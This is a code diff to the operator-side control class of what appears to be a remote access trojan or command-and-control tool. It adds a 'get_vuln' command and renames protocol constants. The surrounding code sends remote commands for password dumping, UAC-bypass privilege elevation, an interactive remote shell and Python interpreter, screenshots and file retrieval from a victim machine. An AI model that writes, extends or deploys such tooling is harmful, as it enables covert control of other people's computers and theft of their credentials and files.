@@ -22,6 +22,20 @@ class Control:
         self.logger = logging.getLogger(LOGGER_ID)
         self.es = None
 
+    def get_vuln(self, exploit_only=False):
+        self.es.send_json(CLIENT_GET_VULN, exploit_only)
+
+        self.logger.info("Please wait...")
+
+        rsp = self.es.recv_json()
+
+        if rsp["key"] == SUCCESS:
+            data = self.es.recvall(rsp["value"]["buffer"]).decode("utf-8")
+            print(f"\n{data}")
+
+        elif rsp["key"] == ERROR:
+            self.logger.error(rsp["value"])
+
     def password_dump(self, password=None):
         self.es.send_json(CLIENT_PWD, password)
 
@@ -29,7 +43,7 @@ class Control:
 
         rsp = self.es.recv_json()
 
-        if rsp["key"] == SERVER_FILE_RECV:
+        if rsp["key"] == SUCCESS:
             data = self.es.recvall(rsp["value"]["buffer"]).decode("utf-8")
 
             try:
@@ -53,7 +67,7 @@ class Control:
 
         rsp = self.es.recv_json()
 
-        if rsp["key"] == SERVER_ELEVATE_RSP:
+        if rsp["key"] == SUCCESS:
             data = self.es.recvall(rsp["value"]["buffer"]).decode("utf-8")
 
             self.logger.info(f"Attempted Elevation via UAC Bypass:\n{data}")
@@ -152,11 +166,11 @@ class Control:
             command = input(prompt)
 
             if command.lower() in ["exit", "exit()"]:
-                self.es.send_json(CLIENT_SHELL_LEAVE)
+                self.es.send_json(SERVER_SHELL_LEAVE)
                 break
 
             elif len(command) > 0:
-                self.es.send_json(CLIENT_SHELL_CMD, command)
+                self.es.send_json(SERVER_SHELL_CMD, command)
 
                 rsp = self.es.recv_json()
 
@@ -177,7 +191,7 @@ class Control:
             if command.lower() in ["exit", "exit()"]:
                 break
 
-            self.es.send_json(CLIENT_PYTHON_INTERPRETER_CMD, command)
+            self.es.send_json(SERVER_PYTHON_INTERPRETER_CMD, command)
 
             rsp = self.es.recv_json()
 
@@ -187,14 +201,14 @@ class Control:
                 if data != "":
                     print(f"\n{data}")
 
-        self.es.send_json(CLIENT_PYTHON_INTERPRETER_LEAVE)
+        self.es.send_json(SERVER_PYTHON_INTERPRETER_LEAVE)
 
     def screenshot(self):
         self.es.send_json(CLIENT_SCREENSHOT)
 
         rsp = self.es.recv_json()
 
-        if rsp["key"] == SERVER_SCREENSHOT:
+        if rsp["key"] == SUCCESS:
             buffer = rsp["value"]["buffer"]
 
             self.logger.info(f"File size: {rsp['value']['value']} bytes")
@@ -258,7 +272,7 @@ class Control:
 
         rsp = self.es.recv_json()
 
-        if rsp["key"] == SERVER_FILE_RECV:
+        if rsp["key"] == SUCCESS:
             buffer = rsp["value"]["buffer"]
 
             self.logger.info(f"File size: {rsp['value']['value']} bytes")
